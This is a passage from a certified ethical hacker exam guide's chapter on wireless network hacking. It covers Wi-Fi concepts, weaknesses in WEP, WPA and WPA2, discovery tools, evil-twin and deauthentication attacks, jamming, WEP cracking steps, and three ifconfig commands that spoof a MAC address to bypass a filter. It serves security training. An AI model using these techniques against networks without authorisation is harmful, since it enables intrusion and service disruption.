with an access point first and then “disassociate” when it moves to the next one. This
dropping and reconnecting will prove vital later, trust me.

We should probably pause here for a brief introduction to a couple of terms. Keep in
mind these may not necessarily be testable items as far as EC-Council is concerned, but I
think they’re important nonetheless. When you have a single access point, its “footprint”
is called a basic service area (BSA). Communication between this single AP and its clients
is known as a basic service set (BSS). Suppose, though, you want to extend the range of
your network by adding multiple access points. You’ll need to make sure the channels
are set right, and after they’re set up, you will have created an extended service set (ESS).
As a client moves from one AP in your subnet to another, so long as you’ve configured
everything correctly, the client will disassociate from one AP and (re)associate with
another seamlessly. This movement across multiple APs within a single ESS is known as
roaming. Okay, enough vocabulary. It’s time to move on.

EXAM TIP BSSID is one deinition term that might trip you up. The basic
service set identiier (BSSID) is actually the MAC address o the wireless
access point that is at the center o your BSS.

Another consideration to bring up here deals with the access points and the antennas
they use. It may seem like a weird (and crazy) thing to discuss physical security concerns
with wireless networks because by design they’re accessible from anywhere in the coverage
area. However, that’s exactly the point: many people don’t consider physical security
concerns, and it winds up costing them dearly. Most standard APs use an omnidirectional
antenna, which means the signal emanates from the antenna in equal strength 360 degrees
from the source. Well, it’s at least close to 360 degrees anyway, since the farther away you
get vertically from the signal, the exponentially worse the signal reception gets. But if
you were to, say, install your AP in the corner of a building, three-quarters of your signal
strength would be lost to the parking lot. And the guy sitting out in the car hacking your
network would be very pleased by this.

EXAM TIP A spectrum analyzer can be used to veriy wireless quality, detect
rogue access points, and detect various attacks against your network.

07-ch07.indd 282 14/09/21 3:59 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 7

Chapter 7: Wireless Network Hacking

283

Yagi antenna

Homemade
directional antenna (cantenna)

Omnidirectional antenna

Directional antenna

Figure 7-1 Wireless antennas

A better option may be to use a directional antenna, also sometimes known as a Yagi
antenna. Unidirectional antennas allow you to focus the signal in a specific direction,
which greatly increases signal strength and distance. The benefit is obvious in protecting
against the guy in the parking lot. However, keep in mind this signal is now greatly
increased in strength and distance, so you may find that the guy will simply drive from
his corner parking spot close to the AP to the other side of the building, where you’re
blasting wireless out the windows. The point is, wireless network design needs to take
into account not only the type of antenna used but where it is placed and what is set up
to contain or corral the signal. The last thing you want is for some kid with a Pringles can
a block away tapping into your network; the so-called cantenna is very real and can boost
signals amazingly. Check out Figure 7-1 for some antenna examples.

NOTE A Yagi antenna is merely a type o directional antenna. However, its
name is used or certain directional antennas similar to how “Coke” is used a
lot in the South to indicate soda in general.

Other antennas you can use are dipole and parabolic grid. Dipole antennas have two
signal “towers” and work omnidirectionally. Parabolic grid antennas are one type of
directional antenna and work a lot like satellite dishes. They can have phenomenal range

07-ch07.indd 283 14/09/21 3:59 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 7

CEH Certified Ethical Hacker All-in-One Exam Guide

284

(up to 10 miles due to their power output) but aren’t in use much. Another directional
antenna type is the loop antenna, which looks like a circle.

So, you’ve installed a wireless access point and created a network for clients to connect
to. To identify this network to clients who may be interested in joining, you’ll need to
assign a service set identifier (SSID). The SSID is not a password and provides no security
at all for your network. It is simply a text word (32 characters or less) that identifies your
wireless network. SSIDs are broadcast by default and are easily obtainable even if you try
to turn off the broadcast (in an effort dubbed “SSID cloaking”). The SSID is part of the
header on every packet, so its discovery by a determined attacker is a given, and securing
it is virtually a moot point.

EXAM TIP I you see a question on wireless security, you can ignore any
answer with SSID in it. Remember that SSIDs do nothing or security, other
than identiy which network you’re on. Encryption standards, such as WEP
and WPA, and physical concerns, such as the placement o APs and antennas
used, are your security eatures.

Once the AP is up and a client comes wandering by, it’s time to authenticate so an
IP address can be pulled. Wireless authentication can happen in more than a few ways,
from simple to complicated, but for study purposes there are three main methods you
should look at: Open System Authentication, Shared Key Authentication, and Centralized
Authentication (for example, RADIUS). In Open System Authentication, a client can
simply send an 802.11 authentication frame with the appropriate SSID to an AP and
have it answer with a verification frame. In Shared Key Authentication, the client
participates in a challenge/request scenario, with the AP verifying a decrypted “key” for
authentication. Both methods serve the purpose of proving you belong to the network
and are illustrated in Figure 7-2.

If you want to get really crazy, you can even tie all the bits and pieces of wireless
authentication mechanisms together with an authentication server (RADIUS), forcing
the client into an even more complicated authentication scenarios. The key here is to
remember there is a difference between association and authentication. Association is
the action of a client connecting to an AP, whereas authentication actually identifies the
client before it can access anything on the network.

EXAM TIP The irst time I read about “war chalking” (drawing symbols on
walls and such to indicate wireless network availability) years ago, I thought
it was awesome. A neat geek-hobo language. Now it’s quite outdated.
According to ECC, supposedly someone’s still doing it, somewhere, or
some unknown reason. The symbols are, themselves, airly easy to decipher:
parentheses back to back, as in )(, indicates an open network, but adding
a key (showing it’s locked), a dollar sign (pay-or-access), or a W (or WEP-
enabled) changes the meaning.

07-ch07.indd 284 14/09/21 3:59 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 7

Chapter 7: Wireless Network Hacking

285

Figure 7-2 Probe request

Wireless Probe response
authentication (includes security parameters)

methods Authentication request

Authentication response

Association request
(includes security parameters)

Association response

Open System Authentication process

Authentication request

Challenge text

Client encrypts challenge
and returns

Challenge decryped – if
correct, client authenticated

Client connects

Shared Key Authentication process

Wireless Encryption
Lastly, after everything is set up and engineered appropriately, you’ll want to take some
steps toward security. This may seem like a laughable concept because the media is open
and accessible to anyone within range of the AP, but there are some alternatives available
for security. Some are better than others, but as the old saying goes, some security is bet-
ter than none at all.

There are a host of wireless encryption topics and definitions to cover. I briefly toyed
with an exhaustive romp through all of them but decided against it after thinking about
what you really need to know for the exam. Therefore, I’ll leave some of the “in-the-
weeds” details for another discussion, and many of the definitions to the glossary, and
just stick with the big three here: WEP, WPA, and WPA2.

EXAM TIP WPA-3 is another wireless encryption method, which uses
AES-GCMP-256 or encryption and HMAC-SHA-384 or authentication.
WPA-3 Personal uses something called Dragonly Key Exchange to deliver
password-based authentication through SAE and is resistant to oline and
key recovery attacks. WPA-3 Enterprise uses multiple encryption algorithms
to protect data and employs ECDSA-384 or exchanging keys.

WEP stands for Wired Equivalent Privacy and, in effect, doesn’t effectively encrypt
anything. Now I know you purists are jumping up and down screaming about WEP’s
40- to 232-bit keys, yelling that RC4 is an encryption algorithm. But trust me, it’s not
what WEP was intended for. Yes, “encryption” is part of the deal, but WEP was never
intended to fully protect your data. It was designed to give people using a wireless network

07-ch07.indd 285 14/09/21 4:01 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 7

CEH Certified Ethical Hacker All-in-One Exam Guide

286

the same level of protection someone surfing over an Ethernet wired hub would expect: if
I were on a hub, I wouldn’t expect that the guy in the parking lot could read what I send
and receive because he wouldn’t have physical access to the wire.

NOTE There are a couple o neat notes about WEP to know. First is that there
are three WEP “encryption” options. The 64-bit version uses a 40-bit key, the
128-bit version uses a 104-bit key, and the 256-bit version uses a 232-bit key.
And the second? WEP was basically created without academic, cryptologic,
or public review. Makes you wonder how it made it so ar.

Now think about that for a moment—wired equivalent privacy. No minimally educated
security person walking upright and capable of picking glazed doughnuts over cake ones
would ever consider a hub secure. Granted, WEP makes it harder than sitting out in the
hallway with an antenna and picking up signals without even entering the room, but
does it really provide anything other than a discouragement to casual browsers? Of course
not, and so long as it’s implemented that way, no one can be upset about it.

WEP uses something called an initialization vector (IV) and, per its definition,
provides for confidentiality and integrity. It calculates a 32-bit integrity check value
(ICV) and appends it to the end of the data payload and then provides a 24-bit IV, which
is combined with a key to be input into an RC4 algorithm. The “keystream” created by
the algorithm is encrypted by an XOR operation and combined with the ICV to produce
“encrypted” data. Although this all sounds well and good, it has one giant glaring flaw:
it’s ridiculously easy to crack.

WEP’s IVs are relatively small and, for the most part, get reused pretty frequently.
Additionally, they’re sent in clear text as part of the header. When you add this to the fact
that we all know the cipher used (RC4) and that it wasn’t ever really designed for more
than one-time usage, cracking becomes a matter of time and patience. An attacker simply
needs to generate enough packets to analyze the IVs and come up with the key used. This
allows the attacker to decrypt the WEP shared key on the fly, in real time, and renders
the encryption useless.

Does this mean WEP is entirely useless and should never be used? As far as your exam
goes, that answer may as well be yes, but how about in the real world? Is a WEP-protected
connection in a hotel better than the wired outlet provided to you in the room? That’s
probably something you need to think about. You may prefer the protection the WEP
connection gives you over the complete absence of anything on the wired connection. Not
to mention, you don’t really know what’s on the other end of that port. The point is that
while WEP shouldn’t be considered a secured network standard for your organization, and
it will be roundly destroyed on the exam as being worthless, there are still plenty of uses
for it, and it may turn out to be the best choice for specific situations in your adventures.

NOTE Attackers can get APs to generate bunches o packets by sending
disassociate messages. These aren’t authenticated by any means, so the
resulting barrage o “Please associate with me” packets is more than enough
or the attack. Another option would be to use ARP to generate packets.

07-ch07.indd 286 14/09/21 4:01 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 7

Chapter 7: Wireless Network Hacking

287

A better choice in encryption technology is Wi-Fi Protected Access (WPA) or
WPA2. WPA makes use of something called Temporal Key Integrity Protocol (TKIP),
a 128-bit key, and the client’s MAC address to accomplish much stronger encryption.
The short of it is, WPA changes the key out (hence the “temporal” part of the name)
every 10,000 packets or so, instead of sticking with one and reusing it, as WEP does.
Additionally, the keys are transferred back and forth during an Extensible Authentication
Protocol (EAP) authentication session, which makes use of a four-step handshake process
to prove the client belongs to the AP, and vice versa.

WPA2 is much the same process; however, it was designed with the government and
the enterprise in mind. In something called WPA2 Enterprise, you can tie EAP or a
RADIUS server into the authentication side of WPA2, allowing you to use Kerberos
tickets and other offerings. But what if you just want to use WPA2 at home or on
your small network and don’t want to bother with all those additional, and costly,
authentication measures? No worries, WPA2 Personal is your bag, baby. Much like other
encryption offerings, you simply set up a pre-shared key and give it only to those people
you trust on your network.

A couple final notes on WPA2 include encryption and integrity. Whether Enterprise
or Personal, WPA2 uses AES for encryption, ensuring FIPS 140-2 compliance—
plus AES is just plain better. As for integrity, TKIP had some irregularities originally.
WPA2 addresses these by using something called the Cipher Block Chaining Message
Authentication Code Protocol (CCMP), which sounds really technical and awesome.
What CCMP actually does is something everyone has been doing forever to ensure
integrity—it simply uses something to show the message hasn’t been altered during
transit. The rest of us call them hashes, but CCMP calls them message integrity codes
(MICs), and the entire process is accomplished through cipher block chaining message
authentication code (CBC-MAC).

Driving the Wireless Super Highway
When most people think of wireless technology they only seem to center on the
benefits it provides without a single care in the world about its security. How else
do you explain folks merrily connecting to any available wireless hotspot so they can
continue to watch the Kardashians, and then leaving the settings enabled to connect
automatically next time they get around one that has the same name?

Unfortunately, folks like us, paid to secure and worry about the worst that can
happen, live on a much more paranoid side of reality and have to ask questions others
don’t like to think about. For example, sure your automated driving vehicle sounds
like a great idea, using all sorts of sensors to ensure your trip proceeds smoothly, but
what happens when all those sensors get told left is right, up is down, and reaction
to the red light ahead should be pressing down the accelerator?

Wireless attacks are more and more prevalent, namely because wireless attack
surfaces are more and more available, and it seems the ability to either gain access
to or completely bring down wireless networks gets easier and easier with each

(continued )

07-ch07.indd 287 14/09/21 4:01 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 7

CEH Certified Ethical Hacker All-in-One Exam Guide

288

passing day. True, we should be concerned about guarding against data theft and
defacement of the organization’s public website, but what if our security lapse results
in loss of life?

Ever heard of vehicle-to-everything (V2X)? The idea is your vehicle communicates
with pretty much anything that may affect, or may be affected by, the vehicle. There
are all sorts of components with assorted alphabet soup monikers such as V2I
(vehicle-to-infrastructure), V2N (vehicle-to-network), V2V (vehicle-to-vehicle),
V2P (vehicle-to-pedestrian), V2D (vehicle-to-device), and V2G (vehicle-to-grid),
just to name a few, making up the system as a whole, and we won’t burrow down to
the nitty-gritty on that, but consider that the entire system must be wireless. It has
to be. And that scares the wits out of me.

I found a great writeup on connectivity requirements for V2X, “6 Key
Connectivity Requirements of Autonomous Driving” (https://spectrum.ieee.org/
transportation/advanced-cars/6-key-connectivity-requirements-of-autonomous-
driving), which provides all sorts of insights and information regarding the
implementation of the technology. With V2X design focused on road safety,
traffic efficiency, and energy savings, there are obviously implementation and
maintenance needs to discuss and plan for before going “live.” For example,
automobiles are more and more “electrified,” generating tons of electromagnetic
interference for the various sensors needed to safely drive a vehicle down the road.
Many companies are investigating the use of optical fiber–based connectivity to
avoid EMI, and everyone is racing to miniaturize devices. And let’s not forget the
infrastructure itself. The demands for high-speed, reliable data communication
is only going to rise (a current estimate from the cited article is that a single
“level 5” car will send 25GB of data every minute), and the architecture providing
that must be redundant, real-time, and reliable; no weather or equipment failure
interruptions and, just as importantly, no maintenance downtimes. These wireless
vehicle systems will be incredibly sophisticated, turning the inside of Mom’s
crossover into its own information superhighway, and any one thing going wrong,
any one interruption of service, could prove deadly.

But the most interesting aspect of this article, and what spurred me to write this
little note, is there is only a passing nod to security. It’s all about infrastructure and
needs, and what has to be in place for it all to work. Yet there wasn’t a peep about
measures taken to ensure the security of the system. Like stopping a malicious actor
from denying service to the entire system. Or using it to funnel all traffic down one
road to make his commute time easier. Or, for the psychotically horrific, turning the
freeway into a terror-filled bumper car match.

Is security baked into the system? I’m certain it is, and I’m sure if I keep reading
I’ll find details that calm me down over the whole mess. But the mindset seems to
be, for me anyway, the same as it was in the creation of the Internet and virtually
every other web app created in the past couple of decades, with security as an
afterthought. I hope and pray I’m wrong about that. And when I see a driverless
car delivering my pizza, I won’t immediately think the machines are out to get us.

07-ch07.indd 288 14/09/21 4:01 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 7

Chapter 7: Wireless Network Hacking

289

Wireless Encryption Key Length Integrity
Standard Used IV Size (Bits) (Bits) Check

WEP RC4 24 40/104 CRC-32

WPA RC4 + TKIP 48 128 Michael
Algorithm +
CRC-32

WPA2 AES-CCMP 48 128 CBC-MAC
(CCMP)

Table 7-2 Wireless Encryption Comparison

EXAM TIP Issues exist or every encryption mechanism. WEP issues are
plentiul, and it is particularly susceptible to known-plaintext attacks.
Password attacks against it are relatively simple and easy to pull o. WPA’s
pre-shared key is vulnerable to eavesdropping and oline attacks, and its
TKIP unction is vulnerable to packet spooing. WPA2 also shares the same
pre-shared key issues, and the so-called Hole196 vulnerability (https://
www.inosecurity-magazine.com/blogs/wpa2-exposed-with-hole-196-
vulnerability/) makes it vulnerable to man-in-the-middle (MITM) and denial-
o-service (DoS) attacks.

So, there you have it. WEP, WPA, and WPA2 are your wireless encryption measures.
WEP is relatively easy to crack and, for purposes of your exam, probably should never be
used. However, on your home network you may be okay using WEP—especially if you
take other, commonsense, defense-in-depth measures to protect yourself. WPA and WPA2
are much better choices from an overall security standpoint. The answer to the question
“How do you crack WPA2?” is, unfortunately, not very easily. In fact, if the password in
use is long or particularly complex, it’s improbable you can get it done in any reasonable
timeframe at all since the key has absolutely nothing to do with the password. It’s not
completely impossible; it’s just really tough with AES. The only real way to crack WPA2
is to use a tool that creates the crypto key based on the password (which, of course, you
don’t have). You must capture the authentication handshake used in WPA2 and attempt
to crack the pairwise master key (PMK) from inside (tools such as Aircrack and KisMAC,
a macOS tool, can help with this), but it’s just not that easy to do. A comparison of WEP,
WPA, and WPA2 is shown in Table 7-2.

Wireless Hacking
When it comes to hacking wireless networks, the truly great news is you may not have
much of it to do. Many networks have no security configured at all, and even those that
do have security enabled don’t have it configured correctly. According to studies recently
published by the likes of the International Telecommunications Union (ITU) and other
equally impressive organizations, more than half of all wireless networks don’t have any
security configured at all, and of the remainder, nearly half could be hacked within a
matter of seconds. Granted, a large number of those are home networks that do not

07-ch07.indd 289 14/09/21 4:01 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 7

CEH Certified Ethical Hacker All-in-One Exam Guide

290

represent much of a valued target for hackers; however, the numbers for organization
and business use are equally as eye-popping. If you think that’s good news for hackers,
the follow-up news is even more exciting: wireless communication is expected to grow
tenfold within the next few years. Ladies and gentlemen, start your engines.

EXAM TIP EC-Council has put the various threats acing wireless into ive
main categories: Access Control Attacks, Integrity Attacks, Conidentiality
Attacks, Availability Attacks, and Authentication Attacks. I have no idea i
they’ll put anything rom this list on the exam, but it looks…question worthy
to me.

In versions past, ECC has spent a lot of time concentrating on finding wireless
networks to hack. Thankfully, at least on this one topic, they’ve recognized reality and
pulled back the reins. Spending a lot of time talking about finding wireless networks
makes as much sense as talking about how to find air. So I’m not going to talk about
finding any wireless network—that’s too easy. Instead, I’ll cover how you can find the
wireless network you’re looking for—the one that’s going to get your team inside the
target and provide you with access. The rest of this is just good-to-know information.

NOTE A couple o easy ways to ind wireless networks is to make use o a
service such as WiGLE (https://wigle.net) and to get a glimpse into someone’s
smartphone. WiGLE users register with the site and use NetStumbler in their
cars, with an antenna and a GPS device, to drive around and mark where
wireless networks can be ound. Smartphones generally retain identiiers and
connection details or networks their owners connect to.

First up in our discussion of wireless network discovery are the “war” options. No
matter which technique we’re talking about, the overall action is the same: an attacker
travels around with a Wi-Fi-enabled device looking for open wireless access points/
networks. In war driving, the attacker is in a car. War walking has the attacker on foot.
War flying? I’m betting you could guess it involves airplanes.

Before we cover the system-based tools you’ll see mentioned on your exam, it’s relevant
at this point to talk about the wireless adapter you’ll need for most of them to work. No
matter how great the tool is, if the wireless adapter can’t pull the frames out of the air in
the correct manner, all is lost. Some tools are built this way and work only with certain
chipset adapters, which can be frustrating at times.

The answer for many in wireless hacking used to be to invest in an AirPcap dongle—a
USB wireless adapter that offers several advantages as well as software support (see
Figure 7-3). Sure, it wass expensive, but it sure was worth it. In addition to capturing all
data, management, and control frames (wireless sniffing in Windows without something
like this can be maddening), it worked seamlessly with Aircrack-ng and other sniffing/
injection wireless hacking applications. AirPcap dongles are still readily available, however
their support has deprecated. Other devices (such as metageek’s Eye P.A. 1.12 and Acrylic
wi-fi sniffer) are still referred to in the field as “airpcaps,” and have filled the gap.

07-ch07.indd 290 14/09/21 4:01 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 7

Chapter 7: Wireless Network Hacking

291

Figure 7-3
AirPcap USB

NOTE Want another reason to get a specially made card or wireless
snooping? A big beneit o many specially crated cards is a rather signiicant
boost in radio strength. Some cards are in the 750mW range, representing
roughly three times the power you’d have with your “normal” card. Also,
many have independent connectors or transmit and receive antennas,
which makes this all the more un and eective.

Barring this, you may need to research and download new and different drivers for your
particular card. The MadWifi project (http://madwifi-project.org) used to provide legacy
drivers that may help in certain situations, but you should also check Linux development
websites themselves (for drivers like ath5k and ath9k, which have superseded MadWifi’s
offerings). At any rate, just keep in mind that, much like the ability of wired adapters
to use promiscuous mode for your sniffing efforts, discussed earlier in this book, not all
wireless adapters are created equal, and not all will work with your favorite tool. Be sure
to check the user guides and man pages for lists and tips on correctly configuring your
adapters for use.

NOTE Although people oten expect any wireless card to do the trick, it
simply won’t, and rustration begins beore they ever get to sniing traic,
much less hacking.

I’ve already mentioned WiGLE (https://wigle.net) and how teams of miscreant
hackers have mapped out wireless network locations using GPS and a tool called
NetStumbler (see Figure 7-4). NetStumbler (https://www.netstumbler.com), the tool
employed in this endeavor, can be used for identifying poor coverage locations within
an ESS, detecting interference causes, and finding any rogue access points in the
network (we’ll talk about these later). NetStumbler is Windows based, easy to use, and
compatible with 802.11a, b, and g.

Although it’s usually more of a wireless packet analyzer/sniffer, Kismet (https://
www.kismetwireless.net/) is another wireless discovery option. It works on Linux-based
systems and, unlike NetStumbler, works passively, meaning it detects access points and
clients without actually sending any packets. It can detect access points that have not
been configured (and would then be susceptible to the default out-of-the-box admin
password) and will determine which type of encryption you might be up against.

07-ch07.indd 291 14/09/21 4:01 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 7

CEH Certified Ethical Hacker All-in-One Exam Guide

292

Figure 7-4 NetStumbler

You might also see two other interesting notables about Kismet on your exam: First, it
works by “channel hopping,” to discover as many networks as possible. Second, it has the
ability to sniff packets and save them to a log file, readable by Wireshark or tcpdump.

Attacks
First things first: wireless hacking does not need to be a complicated matter. Some simple
attacks can be carried out with a minimum of technical knowledge and ability. Sure,
there are some really groovy and, dare I say, elegant wireless hacks to be had, but don’t
discount the easy ones. They will probably pay as many dividends as the hacks that take
hours to set up.

For example, take the concept of a rogue access point. The idea here is to place an
access point of your own somewhere—heck, you can even put it outside in the bushes—
and have legitimate users connect to your network instead of the original. Just consider
the possibilities! If someone were to look at his wireless network options and choose to
connect to yours because the signal strength is better or yours is free whereas the others are
not, he’s basically signing over control to you. You could configure completely new DNS
servers and have your AP configure them with the DHCP address offering. That would
then route users to fake websites you create, providing opportunities to steal authentication
information. You also could funnel everything through a packet capture.

Sometimes referred to as “evil twin” (assuming the SSID on the rogue box is set similar
to the legitimate one), an attack like this is incredibly easy to pull off. The only drawback is
evil twins are sometimes really easy to see, and you run a pretty substantial risk of discovery.

07-ch07.indd 292 14/09/21 4:01 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 7

Chapter 7: Wireless Network Hacking

293

You’ll just have to watch out for true security-minded professionals because they’ll be on
the lookout for rogue APs on a continual basis and (should) have plenty of tools available
to help them do the job.

NOTE Cisco is among the leaders in rogue access point detection
technologies. Many o its access points can be conigured to look or other
access points in the same area. I they ind one, they send SNMP or other
messages back to administrators or action, i needed.

Another truly ridiculous attack is called the “ad hoc connection attack.” To be honest,
it shouldn’t ever be successful, but after years in the security management business,
I’ve seen users do some pretty wild things, so almost nothing surprises me anymore.
An ad hoc connection attack occurs when an attacker simply sits down with a laptop
somewhere in your building and advertises an ad hoc network from his laptop. Believe it
or not, people will, eventually, connect to it. Yes, I know it’s tantamount to walking up
to a user with a crossover cable in hand and asking, “Excuse me, would you please plug
this into your system’s NIC? The other end is in my computer and I’d like easy access to
you.” But what can you do?

EXAM TIP The use o rogue APs (evil twins) may also be reerenced as a mis-
association attack. Additionally, aking a well-known hotspot on a rogue AP
(or example, McDonald’s or Starbucks ree Wi-Fi spots) is reerred to as a
“honeyspot” attack. And i you want urther conusion, sometimes—through
the use and twisting o un wordplay—this type o attack can be reerred
to as an “aLTEr” attack; placing a virtual tower between two LTE devices and
hijacking the session.

Another attack on the relatively easy side of the spectrum is the denial-of-service
effort. This can be done in a couple of ways, neither of which is particularly difficult.
First, you can use any number of tools to craft and send de-authenticate (disassociate)
packets to clients of an AP, which will force them to drop their connections. Granted,
they may try to immediately climb back aboard, but there’s nothing stopping you from
performing the same action again. Or you can employ a rogue AP to have legitimate
users connect, thereby removing their access to legitimate networked resources (in ECC
lingo, an unauthorized association).

The other easy DoS wireless attack is to jam the wireless signal altogether, using some
type of jamming device and, usually, a high-gain antenna/amplifier. All wireless devices
are susceptible to some form of jamming and/or interference—it’s simply a matter of
placing enough signals out in the airwaves that the NICs can’t keep up. Tons of jammer
options are available (a quick Google search on wireless jammers will show you over
3 million pages on the subject), ranging from 802.11 networks to Bluetooth and other
wireless networking technologies. Anything generating enough signals in the 2.4 GHz
range would definitely put a crimp in an 802.11b network.

07-ch07.indd 293 14/09/21 4:01 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 7

CEH Certified Ethical Hacker All-in-One Exam Guide

294

CAUTION Messing around with jammers is a really good way to ind
yoursel in hot water with the Federal Communications Commission (FCC),
and could even result in jail time (https://www.cc.gov/general/jammer-
enorcement). I you’re not the military, police, a government contractor, or a
researcher, you stand a good chance o getting in some legal trouble i you
intentionally—or even unintentionally—do something bad with a jammer.
As a matter o act, emitting any energy that could result in jamming is
enough to run aoul o FCC regulations. The Federal Aviation Administration
(FAA) is also particularly harsh about illegal use o jammers. The jammers you
can build/buy on the Internet are plenty enough to cause trouble.

A Cautionary Jamming Note
One of the goals for many illegitimate hackers is the plain old DoS attack. Whether
it’s a resource, machine, segment, or entire network, sometimes shutting down com-
munication is just as valuable to the bad guys as leaving it up and stealing data
(especially in the military world). In wired communications we have a variety of
detection and defense options set up to help prevent against DoS attacks, but have
you given any thought to the wireless world?

FCC rules and the Communication Act of 1934 make marketing, selling, and/or
using a jammer a federal offense and can result in seriously nasty punishment. Check
almost any electronic device in your house right now: there will be an FCC warning
saying that it will not create interference and that it will accept all interference.
However, that doesn’t mean you can’t get a hold of these jammers. For example,
online retailers like Jammers Store (http://jammers.store/) offer small devices about
the size of a cell phone that can effectively shut down all Wi-Fi communication
within a 20-meter radius. That may not sound like much, but if you’ve ever seen
what happens in a boardroom when communications go down, you’d be nodding in
agreement with me now that it’s something to be concerned about.

What if you increased the power output of that little device? Better yet, what if
you have four or five of them to disperse around particularly important networked
areas in an organization? Do you think that causing a communications blackout
for certain people in an organization might have an impact on their mission?
How about its effect on social engineering opportunities? I can guarantee you if
the fourth floor (or whatever floor your specific company’s executives sit on) starts
having communications problems, reverse social engineering opportunities abound.

Even scarier, what if the objective weren’t a simple Wi-Fi network but, instead,
an entire 4G network within a city? Don’t shake your head and discount it as black-
helicopter conspiracy theory—it could really happen. A recent study at Virginia
Tech proposed that a high-speed LTE network could be brought down across city
blocks via a briefcase-sized device costing around $650. Because the delivery of the
LTE signal depends on a small portion of the overall signal (the control instructions
make up less than 1 percent), blocking those instructions effectively destroys the
entire signal. After all, if your phone can’t sync, it can’t send or receive anything.

07-ch07.indd 294 14/09/21 4:01 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 7

Chapter 7: Wireless Network Hacking

295

The good news in all of this is that the availability of these types of devices is
somewhat limited. The bad news is, they’re not very well controlled or regulated,
and money talks. If Lone Star comes after you with his technological jar of raspberry
jam (fans of the movie Spaceballs understand this reference quite well—if you haven’t
seen it, search for the “radar jammed” scene on YouTube), there’s not a whole lot
you can do about it.

NOTE Want another neat tip that can wow your nerd riends at parties? Did
you know wireless products are marked with an FCC ID? And did you urther
know the FCC ID is made up o three or ive “grantee” character codes,
assigned by the FCC, and the remaining characters generally relect the
model number but can be anything o the vendor’s choosing? For example,
the FCC ID on my Linksys router is Q87-WRT1900AC. The grantee code is
Q87, and the remainder is the model number. The more you know….

One defense wireless network administrators attempt is to enforce a MAC filter.
Basically, a MAC filter is a list of MAC addresses that are allowed to associate to the AP;
if your wireless NIC’s address isn’t on the list, you’re denied access. The easy way around
this is to monitor the network to figure out which MAC addresses are in use on the AP
and simply spoof one of them. On a Unix/Linux machine, all you need do is log in as
root, disable the interface, enter a new MAC, and reenable the device:

ifconfig wlan0 down
ifconfig wlan0 hw ether 0A:15:BD:1A:1B:1C
ifconfig wlan0 up

Tons of tools are also available for MAC spoofing. A couple of the easier-to-use ones
are SMAC and TMAC (https://www.klcconsulting.net/smac/ and https://technitium
.com/tmac/, respectively). Both allow you to change the MAC address with just a couple
of clicks and, once you’re done, to return everything to normal with a click of the mouse.

Wireless Encryption Attacks
Cracking WEP is ridiculously easy and can be done with any number of tools. The idea
revolves around generating enough packets to effectively guess the encryption key. The
weak initialization vectors (previously discussed) are the key—specifically, the fact that
they’re reused and sent in clear text. Regardless of the tool, the standard WEP attack
follows the same basic series of steps:

1. Start a compatible wireless adapter on your attack machine and ensure it can both
inject and sniff packets.

2. Start a sniffer to capture packets.

07-ch07.indd 295 14/09/21 4:01 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 7

CEH Certified Ethical Hacker All-in-One Exam Guide

296

3. Use some method to force the creation of thousands and thousands of packets
(generally by using “de-auth” packets).

4. Analyze these captured packets (either in real time or on the side) with a cracking tool.

I thought about including step-by-step examples of the process, using specific tools,
but it wouldn’t serve any point. Each situation is unique, and any steps using a specific
tool may not work for you at your location, which tends to lead to confusion and angst.
The best advice I can give you is to set up a lab and practice yourself. If you don’t have
an extra wireless access point to play with, try hacking your own WAP (just make very
sure you own it; otherwise, unless you have permission to do so, leave it alone). If you get
lost along the way or something doesn’t seem to make sense, just check out any of the
abundant online videos on WEP cracking.

WEP is easy to crack, and more than a few tools are available for cracking WEP. The
Aircrack-ng suite of tools (https://www.aircrack-ng.org/) is probably one of the more
“famous,” and it will definitely show up on your exam somewhere. Aircrack-ng provides
a sniffer, a wireless network detector, a password cracker, and even a traffic analysis tool
and can run on both Windows and Linux. If you really want to dig into the toolset,
Aircrack-ng uses different techniques for cracking different encryption standards. On
WEP, for instance, it can use a dictionary technique or a variety of weirdly named
algorithmic processes called PTW, FMS, and the Korek technique.

EXAM TIP Aircrack-ng may use a dictionary technique or cracking WPA and
WPA2. The other weird techniques are reserved or cracking WEP.

Cain and Abel (discussed in Chapter 5) will do the job easily, just sniffing packets
and cracking as stated earlier, although it may take a little longer than some other tools.
KisMAC (a macOS application; https://kismac-ng.org/) can be used to brute-force WEP
or WPA passwords. Other tools include WEPAttack (http://wepattack.sourceforge.net),
WEPCrack (http://wepcrack.sourceforge.net), SecPoint Portable Penetrator (a mobile
tool; https://www.secpoint.com), and Elcomsoft Wireless Security Auditor (https://
www.elcomsoft.com/ewsa.html).

EXAM TIP Cain and Abel relies on statistical measures and the PTW technique
to break WEP codes.

WPA and WPA2 are exponentially more difficult to crack. Both rely on and use
a pre-shared, user-defined password alongside a constantly changed temporal key to
provide protection. The process of cracking WPA is really hard and basically comes
down to one tactic: brute force. Much like WEP, force a bunch of packets to be sent
and store them, then run them through an offline cracker (like Aircrack-ng) to brute-
force against those packets until you’re successful.

Another method of attack you’re almost guaranteed to encounter on the exam is the
Key Reinstallation Attack (aka KRACK). KRACK is basically a replay attack that takes

07-ch07.indd 296 14/09/21 4:01 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 7

Chapter 7: Wireless Network Hacking

297

